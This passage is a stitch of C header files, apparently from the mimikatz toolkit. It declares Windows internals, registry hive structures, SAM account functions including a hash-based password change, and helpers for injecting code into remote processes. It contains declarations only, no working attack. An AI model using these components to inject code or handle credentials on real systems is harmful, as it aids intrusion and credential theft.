	BOOLEAN Spare0[15];
	//ULONGLONG Spare1;
} SYSTEM_ISOLATED_USER_MODE_INFORMATION, *PSYSTEM_ISOLATED_USER_MODE_INFORMATION;

#define OBJ_INHERIT             0x00000002L
#define OBJ_PERMANENT           0x00000010L
#define OBJ_EXCLUSIVE           0x00000020L
#define OBJ_CASE_INSENSITIVE    0x00000040L
#define OBJ_OPENIF              0x00000080L
#define OBJ_OPENLINK            0x00000100L
#define OBJ_KERNEL_HANDLE       0x00000200L
#define OBJ_FORCE_ACCESS_CHECK  0x00000400L
#define OBJ_VALID_ATTRIBUTES    0x000007F2L

typedef struct _OBJECT_ATTRIBUTES64 {
	ULONG Length;
	ULONG64 RootDirectory;
	ULONG64 ObjectName;
	ULONG Attributes;
	ULONG64 SecurityDescriptor;
	ULONG64 SecurityQualityOfService;
} OBJECT_ATTRIBUTES64;
typedef OBJECT_ATTRIBUTES64 *POBJECT_ATTRIBUTES64;
typedef CONST OBJECT_ATTRIBUTES64 *PCOBJECT_ATTRIBUTES64;

typedef struct _OBJECT_ATTRIBUTES32 {
	ULONG Length;
	ULONG RootDirectory;
	ULONG ObjectName;
	ULONG Attributes;
	ULONG SecurityDescriptor;
	ULONG SecurityQualityOfService;
} OBJECT_ATTRIBUTES32;
typedef OBJECT_ATTRIBUTES32 *POBJECT_ATTRIBUTES32;
typedef CONST OBJECT_ATTRIBUTES32 *PCOBJECT_ATTRIBUTES32;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
	PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;
typedef CONST OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

#define RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a) \
    { sizeof(OBJECT_ATTRIBUTES), NULL, RTL_CONST_CAST(PUNICODE_STRING)(n), a, NULL, NULL }

#define RTL_INIT_OBJECT_ATTRIBUTES(n, a) RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a)

#define DIRECTORY_QUERY					0x0001
#define DIRECTORY_TRAVERSE				0x0002
#define DIRECTORY_CREATE_OBJECT			0x0004
#define DIRECTORY_CREATE_SUBDIRECTORY	0x0008
#define DIRECTORY_ALL_ACCESS			STANDARD_RIGHTS_REQUIRED | 0xF

typedef struct _OBJECT_DIRECTORY_INFORMATION {
	UNICODE_STRING Name;
	UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;

extern NTSTATUS WINAPI NtQuerySystemInformation(IN SYSTEM_INFORMATION_CLASS SystemInformationClass, OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT OPTIONAL PULONG ReturnLength);
extern NTSTATUS WINAPI NtQuerySystemInformationEx(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID InputBuffer,  ULONG InputBufferLength,  PVOID SystemInformation,  ULONG SystemInformationLength, ULONG *ReturnLength);
extern NTSTATUS WINAPI NtSetSystemInformation(IN SYSTEM_INFORMATION_CLASS SystemInformationClass, IN PVOID SystemInformation, IN ULONG SystemInformationLength);
extern NTSTATUS WINAPI NtQueryInformationProcess(IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, OUT ULONG ProcessInformationLength, OUT OPTIONAL PULONG ReturnLength);
extern NTSTATUS WINAPI NtSuspendProcess(IN HANDLE ProcessHandle);
extern NTSTATUS WINAPI NtResumeProcess(IN HANDLE ProcessHandle);
extern NTSTATUS WINAPI NtTerminateProcess(IN OPTIONAL HANDLE ProcessHandle, IN NTSTATUS ExitStatus);
extern NTSTATUS WINAPI NtOpenDirectoryObject(OUT PHANDLE DirectoryHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes);
extern NTSTATUS WINAPI NtQueryDirectoryObject(IN HANDLE DirectoryHandle, OUT OPTIONAL PVOID Buffer, IN ULONG Length, IN BOOLEAN ReturnSingleEntry, IN BOOLEAN RestartScan, IN OUT PULONG Context, OUT OPTIONAL PULONG ReturnLength);

typedef NTSTATUS (WINAPI * PNTQUERYSYSTEMINFORMATIONEX) (SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID InputBuffer,  ULONG InputBufferLength,  PVOID SystemInformation,  ULONG SystemInformationLength, ULONG *ReturnLength);

extern PPEB WINAPI RtlGetCurrentPeb();
extern NTSTATUS WINAPI RtlAdjustPrivilege(IN ULONG Privilege, IN BOOL Enable, IN BOOL CurrentThread, OUT PULONG pPreviousState);
extern NTSTATUS	WINAPI RtlCreateUserThread(IN HANDLE Process, IN OPTIONAL PSECURITY_DESCRIPTOR ThreadSecurityDescriptor, IN CHAR Flags, IN OPTIONAL ULONG ZeroBits, IN OPTIONAL SIZE_T MaximumStackSize, IN OPTIONAL SIZE_T CommittedStackSize, IN OPTIONAL PTHREAD_START_ROUTINE StartAddress, IN OPTIONAL PVOID Parameter, OUT OPTIONAL PHANDLE Thread, OUT OPTIONAL PCLIENT_ID ClientId);



NTSTATUS kull_m_process_NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS informationClass, PVOID buffer, ULONG informationLength);
typedef BOOL (CALLBACK * PKULL_M_PROCESS_ENUM_CALLBACK) (PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg);
NTSTATUS kull_m_process_getProcessInformation(PKULL_M_PROCESS_ENUM_CALLBACK callBack, PVOID pvArg);
BOOL CALLBACK kull_m_process_callback_pidForName(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg);
BOOL kull_m_process_getProcessIdForName(LPCWSTR name, PDWORD processId);


NTSTATUS kull_m_process_getVeryBasicModuleInformations(PKULL_M_MEMORY_HANDLE memory, PKULL_M_MODULE_ENUM_CALLBACK callBack, PVOID pvArg);
void kull_m_process_adjustTimeDateStamp(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION information);
BOOL CALLBACK kull_m_process_callback_moduleForName(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);
BOOL CALLBACK kull_m_process_callback_moduleFirst(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);
BOOL kull_m_process_getVeryBasicModuleInformationsForName(PKULL_M_MEMORY_HANDLE memory, PCWSTR name, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION informations);


typedef BOOL (CALLBACK * PKULL_M_EXPORTED_ENTRY_ENUM_CALLBACK) (PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg);
NTSTATUS kull_m_process_getExportedEntryInformations(PKULL_M_MEMORY_ADDRESS address, PKULL_M_EXPORTED_ENTRY_ENUM_CALLBACK callBack, PVOID pvArg);

typedef struct _KULL_M_PROCESS_PROCADDRESS_FOR_NAME {
	PCSTR name;
	KULL_M_MEMORY_ADDRESS address;
	BOOL				isFound;
} KULL_M_PROCESS_PROCADDRESS_FOR_NAME, *PKULL_M_PROCESS_PROCADDRESS_FOR_NAME;
BOOL CALLBACK kull_m_process_getProcAddress_callback(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg);
BOOL kull_m_process_getProcAddress(PKULL_M_MEMORY_ADDRESS moduleAddress, PCSTR name, PKULL_M_MEMORY_ADDRESS functionAddress);


NTSTATUS kull_m_process_getImportedEntryInformations(PKULL_M_MEMORY_ADDRESS address, PKULL_M_IMPORTED_ENTRY_ENUM_CALLBACK callBack, PVOID pvArg);
PSTR kull_m_process_getImportNameWithoutEnd(PKULL_M_MEMORY_ADDRESS base);

typedef BOOL (CALLBACK * PKULL_M_MEMORY_RANGE_ENUM_CALLBACK) (PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg);
NTSTATUS kull_m_process_getMemoryInformations(PKULL_M_MEMORY_HANDLE memory, PKULL_M_MEMORY_RANGE_ENUM_CALLBACK callBack, PVOID pvArg);

BOOL kull_m_process_peb(PKULL_M_MEMORY_HANDLE memory, PPEB pPeb, BOOL isWOW);
BOOL kull_m_process_ntheaders(PKULL_M_MEMORY_ADDRESS pBase, PIMAGE_NT_HEADERS * pHeaders);
BOOL kull_m_process_datadirectory(PKULL_M_MEMORY_ADDRESS pBase, DWORD entry, PDWORD pRva, PDWORD pSize, PWORD pMachine, PVOID *pData);

typedef enum _KULL_M_PROCESS_CREATE_TYPE {
		KULL_M_PROCESS_CREATE_NORMAL,
		KULL_M_PROCESS_CREATE_USER,
		//KULL_M_PROCESS_CREATE_TOKEN,
		KULL_M_PROCESS_CREATE_LOGON,
} KULL_M_PROCESS_CREATE_TYPE;

BOOL kull_m_process_create(KULL_M_PROCESS_CREATE_TYPE type, PCWSTR commandLine, DWORD processFlags, HANDLE hToken, DWORD logonFlags, PCWSTR user, PCWSTR domain, PCWSTR password, PPROCESS_INFORMATION pProcessInfos, BOOL autoCloseHandle);

BOOL kull_m_process_getUnicodeString(IN PUNICODE_STRING string, IN PKULL_M_MEMORY_HANDLE source);
BOOL kull_m_process_getSid(IN PSID * pSid, IN PKULL_M_MEMORY_HANDLE source);
PWSTR kull_m_process_get_wstring_without_end(PKULL_M_MEMORY_ADDRESS base, DWORD cbMaxChar);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_string.h"
//#include "kull_m_hid.h" // to adapt

#define RDM_SLEEP_BEFORE_SEND				10
#define RDM_SLEEP_BEFORE_RECV				10


#define RDM_IOCTL_14443A_REQ						0x03
#define RDM_IOCTL_14443A_ANTICOLL					0x04
#define RDM_IOCTL_14443A_SELECT						0x05
#define RDM_IOCTL_14443A_HALT						0x06

#define RDM_IOCTL_14443B_REQ						0x09
#define RDM_IOCTL_14443B_ANTICOLL					0x0a
#define RDM_IOCTL_14443B_ATTRIB						0x0b
#define RDM_IOCTL_14443B_RESET						0x0c

#define RDM_IOCTL_14443_DIRECT						0x0d // ISO14443_TypeB_Transfer_Command (MF_TypeATransCOSCmd in code ?)

#define RDM_IOCTL_15693_INVENTORY					0x10
#define RDM_IOCTL_15693_READ						0x11
#define RDM_IOCTL_15693_WRITE						0x12
#define RDM_IOCTL_15693_LOCK_BLOCK					0x13
#define RDM_IOCTL_15693_STAY_QUIET					0x14
#define RDM_IOCTL_15693_SELECT						0x15
#define RDM_IOCTL_15693_RESET_TO_READY				0x16
#define RDM_IOCTL_15693_WRITE_AFI					0x17
#define RDM_IOCTL_15693_LOCK_AFI					0x18
#define RDM_IOCTL_15693_WRITE_DSFID					0x19
#define RDM_IOCTL_15693_LOCK_DSFID					0x1a
#define RDM_IOCTL_15693_GET_INFORMATION				0x1b
#define RDM_IOCTL_15693_GET_MULTIPLE_BLOCK_SECURITY	0x1c
#define RDM_IOCTL_15693_DIRECT						0x1d


#define RDM_IOCTL_MF_READ							0x20
#define RDM_IOCTL_MF_WRITE							0x21
#define RDM_IOCTL_MF_INIT_VALUE						0x22
#define RDM_IOCTL_MF_DEC							0x23
#define RDM_IOCTL_MF_INC							0x24
#define RDM_IOCTL_MF_GET_SNR						0x25

#define RDM_IOCTL_MF_RESTORE						0x28 // ISO14443_TypeA_Transfer_Command(0X28) ?

// SYSTEM COMMANDS
#define RDM_IOCTL_SET_ADDRESS						0x80
#define RDM_IOCTL_SET_BAUDRATE						0x81
#define RDM_IOCTL_SET_SER_NUM						0x82
#define RDM_IOCTL_GET_SER_NUM						0x83
#define RDM_IOCTL_SET_USER_INFO						0x84
#define RDM_IOCTL_GET_USER_INFO						0x85
#define RDM_IOCTL_GET_VERSION						0x86
#define RDM_IOCTL_CONTROL_LED1						0x87
#define RDM_IOCTL_CONTROL_LED2						0x88
#define RDM_IOCTL_CONTROL_BUZZER					0x89


typedef struct _RDM_DEVICE {
	struct _RDM_DEVICE * next;
	DWORD id;
	PWCHAR DevicePath;
	HIDD_ATTRIBUTES hidAttributes;
	HIDP_CAPS hidCaps;
	HANDLE hDevice;
} RDM_DEVICE, *PRDM_DEVICE;

BOOL rdm_get_version(HANDLE hFile, PSTR *version);

BOOL rdm_send_receive(HANDLE hFile, BYTE ctl, LPCVOID in, BYTE szIn, LPBYTE *out, BYTE *szOut);
BOOL rdm_devices_get(PRDM_DEVICE *devices, DWORD *count);
void rdm_devices_free(PRDM_DEVICE devices);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kull_m_registry_structures.h"
//#include "kull_m_string.h"



BOOL kull_m_registry_open(IN KULL_M_REGISTRY_TYPE Type, IN HANDLE hAny, BOOL isWrite, OUT PKULL_M_REGISTRY_HANDLE *hRegistry);
PKULL_M_REGISTRY_HANDLE kull_m_registry_close(IN PKULL_M_REGISTRY_HANDLE hRegistry);

BOOL kull_m_registry_RegOpenKeyEx(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hKey, IN OPTIONAL LPCWSTR lpSubKey, IN DWORD ulOptions, IN REGSAM samDesired, OUT PHKEY phkResult);
BOOL kull_m_registry_RegCloseKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hKey);
BOOL kull_m_registry_RegQueryValueEx(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hKey, IN OPTIONAL LPCWSTR lpValueName, IN LPDWORD lpReserved, OUT OPTIONAL LPDWORD lpType, OUT OPTIONAL LPBYTE lpData, IN OUT OPTIONAL LPDWORD lpcbData);
BOOL kull_m_registry_RegSetValueEx(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hKey, IN OPTIONAL LPCWSTR lpValueName, IN DWORD Reserved, IN DWORD dwType, IN OPTIONAL LPCBYTE lpData, IN DWORD cbData);
BOOL kull_m_registry_RegQueryInfoKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hKey, OUT OPTIONAL LPWSTR lpClass, IN OUT OPTIONAL LPDWORD lpcClass, IN OPTIONAL LPDWORD lpReserved, OUT OPTIONAL LPDWORD lpcSubKeys, OUT OPTIONAL LPDWORD lpcMaxSubKeyLen, OUT OPTIONAL LPDWORD lpcMaxClassLen, OUT OPTIONAL LPDWORD lpcValues, OUT OPTIONAL LPDWORD lpcMaxValueNameLen, OUT OPTIONAL LPDWORD lpcMaxValueLen, OUT OPTIONAL LPDWORD lpcbSecurityDescriptor, OUT OPTIONAL PFILETIME lpftLastWriteTime);

BOOL kull_m_registry_RegEnumKeyEx(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hKey, IN DWORD dwIndex, OUT LPWSTR lpName, IN OUT LPDWORD lpcName, IN LPDWORD lpReserved, OUT OPTIONAL LPWSTR lpClass, IN OUT OPTIONAL LPDWORD lpcClass, OUT OPTIONAL PFILETIME lpftLastWriteTime);
BOOL kull_m_registry_RegEnumValue(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hKey, IN DWORD dwIndex, OUT LPWSTR lpValueName, IN OUT LPDWORD lpcchValueName, IN LPDWORD lpReserved, OUT OPTIONAL LPDWORD lpType, OUT OPTIONAL LPBYTE lpData, OUT OPTIONAL LPDWORD lpcbData);

BOOL kull_m_registry_OpenAndQueryWithAlloc(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hKey, IN OPTIONAL LPCWSTR lpSubKey, IN OPTIONAL LPCWSTR lpValueName, OUT OPTIONAL LPDWORD lpType, OUT OPTIONAL LPVOID *lpData, IN OUT OPTIONAL LPDWORD lpcbData);
BOOL kull_m_registry_QueryWithAlloc(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hKey, IN OPTIONAL LPCWSTR lpValueName, OUT OPTIONAL LPDWORD lpType, OUT OPTIONAL LPVOID *lpData, IN OUT OPTIONAL LPDWORD lpcbData);

PKULL_M_REGISTRY_HIVE_KEY_NAMED kull_m_registry_searchKeyNamedInList(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN PKULL_M_REGISTRY_HIVE_BIN_CELL pHbC, IN LPCWSTR lpSubKey);
PKULL_M_REGISTRY_HIVE_VALUE_KEY kull_m_registry_searchValueNameInList(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hKey, IN OPTIONAL LPCWSTR lpValueName);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"

#define KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_VOLATILE	0x0001
#define KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_MOUNT_POINT	0x0002
#define KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_ROOT		0x0004
#define KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_LOCKED		0x0008
#define KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_SYMLINK		0x0010
#define KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_ASCII_NAME	0x0020

#define KULL_M_REGISTRY_HIVE_VALUE_KEY_FLAG_ASCII_NAME	0x0001

typedef struct _KULL_M_REGISTRY_HIVE_HEADER
{
	DWORD tag;
	DWORD seqPri;
	DWORD seqSec;
	FILETIME lastModification;
	DWORD versionMajor;
	DWORD versionMinor;
	DWORD fileType;
	DWORD unk0;
	LONG offsetRootKey;
	DWORD szData;
	DWORD unk1;
	BYTE unk2[64];
	BYTE unk3[396];
	DWORD checksum;
	BYTE padding[3584];
} KULL_M_REGISTRY_HIVE_HEADER, *PKULL_M_REGISTRY_HIVE_HEADER;

typedef struct _KULL_M_REGISTRY_HIVE_BIN_HEADER
{
	DWORD tag;
	LONG offsetHiveBin;
	DWORD szHiveBin;
	DWORD unk0;
	DWORD unk1;
	FILETIME timestamp;
	DWORD unk2;
} KULL_M_REGISTRY_HIVE_BIN_HEADER, *PKULL_M_REGISTRY_HIVE_BIN_HEADER;







typedef struct _KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT
{
	LONG offsetNamedKey;
	DWORD hash;
} KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT, *PKULL_M_REGISTRY_HIVE_LF_LH_ELEMENT;

typedef struct _KULL_M_REGISTRY_HIVE_LF_LH
{
	LONG szCell;
	WORD tag;
	WORD nbElements;
	KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT elements[ANYSIZE_ARRAY];
} KULL_M_REGISTRY_HIVE_LF_LH, *PKULL_M_REGISTRY_HIVE_LF_LH;

typedef struct _KULL_M_REGISTRY_HIVE_VALUE_LIST
{
	LONG szCell;
	LONG offsetValue[ANYSIZE_ARRAY];
} KULL_M_REGISTRY_HIVE_VALUE_LIST, *PKULL_M_REGISTRY_HIVE_VALUE_LIST;

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "../modules/kull_m_process.h"



typedef struct _REMOTE_EXT {
	PCWCHAR	Module;
	PCHAR	Function;
	PVOID	ToReplace;
	PVOID	Pointer;
} REMOTE_EXT, *PREMOTE_EXT;

typedef struct _MULTIPLE_REMOTE_EXT {
	DWORD count;
	PREMOTE_EXT extensions;
} MULTIPLE_REMOTE_EXT, *PMULTIPLE_REMOTE_EXT;

BOOL CALLBACK kull_m_remotelib_callback_module_exportedEntry(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg);
PREMOTE_LIB_INPUT_DATA kull_m_remotelib_CreateInput(PVOID inputVoid, DWORD inputDword, DWORD inputSize, LPCVOID inputData);
BOOL kull_m_remotelib_create(PKULL_M_MEMORY_ADDRESS aRemoteFunc, PREMOTE_LIB_INPUT_DATA input, PREMOTE_LIB_OUTPUT_DATA output);

BOOL CALLBACK kull_m_remotelib_exports_callback_module_exportedEntry(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg);
BOOL CALLBACK kull_m_remotelib_exports_callback_module(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);
BOOL kull_m_remotelib_GetProcAddressMultipleModules(PKULL_M_MEMORY_HANDLE hProcess, PMULTIPLE_REMOTE_EXT extForCb);
BOOL kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(PKULL_M_MEMORY_HANDLE hProcess, LPCVOID Buffer, DWORD BufferSize, PMULTIPLE_REMOTE_EXT RemoteExt, PKULL_M_MEMORY_ADDRESS DestAddress);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"





typedef struct _SAMPR_RID_ENUMERATION {
	DWORD RelativeId;
	LSA_UNICODE_STRING Name;
} SAMPR_RID_ENUMERATION, *PSAMPR_RID_ENUMERATION;

typedef struct _SAMPR_GET_MEMBERS_BUFFER {
	DWORD MemberCount;
	DWORD *Members;
	DWORD *Attributes;
} SAMPR_GET_MEMBERS_BUFFER, *PSAMPR_GET_MEMBERS_BUFFER;

extern NTSTATUS WINAPI SamConnect(IN PUNICODE_STRING ServerName, OUT SAMPR_HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted);
extern NTSTATUS WINAPI SamConnectWithCreds(IN PUNICODE_STRING ServerName, OUT SAMPR_HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN LSA_OBJECT_ATTRIBUTES * ObjectAttributes, IN RPC_AUTH_IDENTITY_HANDLE AuthIdentity, IN PWSTR ServerPrincName, OUT ULONG * unk0);
extern NTSTATUS WINAPI SamEnumerateDomainsInSamServer(IN SAMPR_HANDLE ServerHandle, OUT DWORD * EnumerationContext, OUT PSAMPR_RID_ENUMERATION* Buffer, IN DWORD PreferedMaximumLength, OUT DWORD * CountReturned);
extern NTSTATUS WINAPI SamLookupDomainInSamServer(IN SAMPR_HANDLE ServerHandle, IN PUNICODE_STRING Name, OUT PSID * DomainId);

extern NTSTATUS WINAPI SamOpenDomain(IN SAMPR_HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT SAMPR_HANDLE * DomainHandle);
extern NTSTATUS WINAPI SamOpenUser(IN SAMPR_HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT SAMPR_HANDLE * UserHandle);
extern NTSTATUS WINAPI SamOpenGroup(IN SAMPR_HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD GroupId, OUT SAMPR_HANDLE * GroupHandle);
extern NTSTATUS WINAPI SamOpenAlias(IN SAMPR_HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD AliasId, OUT SAMPR_HANDLE * AliasHandle);
extern NTSTATUS WINAPI SamQueryInformationUser(IN SAMPR_HANDLE UserHandle, IN USER_INFORMATION_CLASS UserInformationClass, PSAMPR_USER_INFO_BUFFER* Buffer);
extern NTSTATUS WINAPI SamSetInformationUser(IN SAMPR_HANDLE UserHandle, IN USER_INFORMATION_CLASS UserInformationClass, PSAMPR_USER_INFO_BUFFER Buffer);
extern NTSTATUS WINAPI SamiChangePasswordUser(IN SAMPR_HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE oldLM[LM_NTLM_HASH_LENGTH], IN const BYTE newLM[LM_NTLM_HASH_LENGTH], IN BOOL isNewNTLM, IN const BYTE oldNTLM[LM_NTLM_HASH_LENGTH], IN const BYTE newNTLM[LM_NTLM_HASH_LENGTH]);

extern NTSTATUS WINAPI SamGetGroupsForUser(IN SAMPR_HANDLE UserHandle, OUT PGROUP_MEMBERSHIP * Groups, OUT DWORD * CountReturned);
extern NTSTATUS WINAPI SamGetAliasMembership(IN SAMPR_HANDLE DomainHandle, IN DWORD Count, IN PSID * Sid, OUT DWORD * CountReturned, OUT PDWORD * RelativeIds);

extern NTSTATUS WINAPI SamGetMembersInGroup(IN SAMPR_HANDLE GroupHandle, OUT PDWORD *Members, OUT PDWORD *Attributes, OUT DWORD * CountReturned); // todo !!!
extern NTSTATUS WINAPI SamGetMembersInAlias(IN SAMPR_HANDLE AliasHandle, OUT PSID ** Members, OUT DWORD * CountReturned);

extern NTSTATUS WINAPI SamEnumerateUsersInDomain(IN SAMPR_HANDLE DomainHandle, IN OUT PDWORD EnumerationContext, IN DWORD UserAccountControl, OUT PSAMPR_RID_ENUMERATION* Buffer, IN DWORD PreferedMaximumLength, OUT PDWORD CountReturned);
extern NTSTATUS WINAPI SamEnumerateGroupsInDomain(IN SAMPR_HANDLE DomainHandle, IN OUT PDWORD EnumerationContext, OUT PSAMPR_RID_ENUMERATION * Buffer, IN DWORD PreferedMaximumLength, OUT PDWORD CountReturned);
extern NTSTATUS WINAPI SamEnumerateAliasesInDomain(IN SAMPR_HANDLE DomainHandle, IN OUT PDWORD EnumerationContext, OUT PSAMPR_RID_ENUMERATION * Buffer, IN DWORD PreferedMaximumLength, OUT PDWORD CountReturned);
extern NTSTATUS WINAPI SamLookupNamesInDomain(IN SAMPR_HANDLE DomainHandle, IN DWORD Count, IN PUNICODE_STRING Names, OUT PDWORD * RelativeIds, OUT PDWORD * Use);
extern NTSTATUS WINAPI SamLookupIdsInDomain(IN SAMPR_HANDLE DomainHandle, IN DWORD Count, IN PDWORD RelativeIds, OUT PUNICODE_STRING * Names, OUT PDWORD * Use);
extern NTSTATUS WINAPI SamRidToSid(IN SAMPR_HANDLE ObjectHandle, IN DWORD Rid, OUT PSID * Sid);
extern NTSTATUS WINAPI SamCloseHandle(IN SAMPR_HANDLE SamHandle);
extern NTSTATUS WINAPI SamFreeMemory(IN PVOID Buffer);

#define SAM_SERVER_CONNECT				0x00000001
#define SAM_SERVER_SHUTDOWN				0x00000002
#define SAM_SERVER_INITIALIZE			0x00000004
#define SAM_SERVER_CREATE_DOMAIN		0x00000008
#define SAM_SERVER_ENUMERATE_DOMAINS	0x00000010
#define SAM_SERVER_LOOKUP_DOMAIN		0x00000020
#define SAM_SERVER_ALL_ACCESS			0x000f003f
#define SAM_SERVER_READ					0x00020010
#define SAM_SERVER_WRITE				0x0002000e
#define SAM_SERVER_EXECUTE				0x00020021

#define SAM_DOMAIN_OBJECT				0x00000000
#define SAM_GROUP_OBJECT				0x10000000
#define SAM_NON_SECURITY_GROUP_OBJECT	0x10000001
#define SAM_ALIAS_OBJECT				0x20000000
#define SAM_NON_SECURITY_ALIAS_OBJECT	0x20000001
#define SAM_USER_OBJECT					0x30000000
#define SAM_MACHINE_ACCOUNT				0x30000001
#define SAM_TRUST_ACCOUNT				0x30000002
#define SAM_APP_BASIC_GROUP				0x40000000
#define SAM_APP_QUERY_GROUP				0x40000001

#define DOMAIN_READ_PASSWORD_PARAMETERS	0x00000001
#define DOMAIN_WRITE_PASSWORD_PARAMS	0x00000002
#define DOMAIN_READ_OTHER_PARAMETERS	0x00000004
#define DOMAIN_WRITE_OTHER_PARAMETERS	0x00000008
#define DOMAIN_CREATE_USER				0x00000010
#define DOMAIN_CREATE_GROUP				0x00000020
#define DOMAIN_CREATE_ALIAS				0x00000040
#define DOMAIN_GET_ALIAS_MEMBERSHIP		0x00000080
#define DOMAIN_LIST_ACCOUNTS			0x00000100
#define DOMAIN_LOOKUP					0x00000200
#define DOMAIN_ADMINISTER_SERVER		0x00000400
#define DOMAIN_ALL_ACCESS				0x000f07ff
#define DOMAIN_READ						0x00020084
#define DOMAIN_WRITE					0x0002047a
#define DOMAIN_EXECUTE					0x00020301

#define GROUP_READ_INFORMATION			0x00000001
#define GROUP_WRITE_ACCOUNT				0x00000002
#define GROUP_ADD_MEMBER				0x00000004
#define GROUP_REMOVE_MEMBER				0x00000008
#define GROUP_LIST_MEMBERS				0x00000010
#define GROUP_ALL_ACCESS				0x000F001F
#define GROUP_READ						0x00020010
#define GROUP_WRITE						0x0002000E
#define GROUP_EXECUTE					0x00020001

#define ALIAS_ADD_MEMBER				0x00000001
#define ALIAS_REMOVE_MEMBER				0x00000002
#define ALIAS_LIST_MEMBERS				0x00000004
#define ALIAS_READ_INFORMATION			0x00000008
#define ALIAS_WRITE_ACCOUNT				0x00000010
#define ALIAS_ALL_ACCESS				0x000F001F
#define ALIAS_READ						0x00020004
#define ALIAS_WRITE						0x00020013
#define ALIAS_EXECUTE					0x00020008

#define USER_READ_GENERAL				0x00000001
#define USER_READ_PREFERENCES			0x00000002
#define USER_WRITE_PREFERENCES			0x00000004
#define USER_READ_LOGON					0x00000008
#define USER_READ_ACCOUNT				0x00000010
#define USER_WRITE_ACCOUNT				0x00000020
#define USER_CHANGE_PASSWORD			0x00000040
#define USER_FORCE_PASSWORD_CHANGE		0x00000080
#define USER_LIST_GROUPS				0x00000100
#define USER_READ_GROUP_INFORMATION		0x00000200
#define USER_WRITE_GROUP_INFORMATION	0x00000400
#define USER_ALL_ACCESS					0x000f07ff
#define USER_READ						0x0002031a
#define USER_WRITE						0x00020044
#define USER_EXECUTE					0x00020041

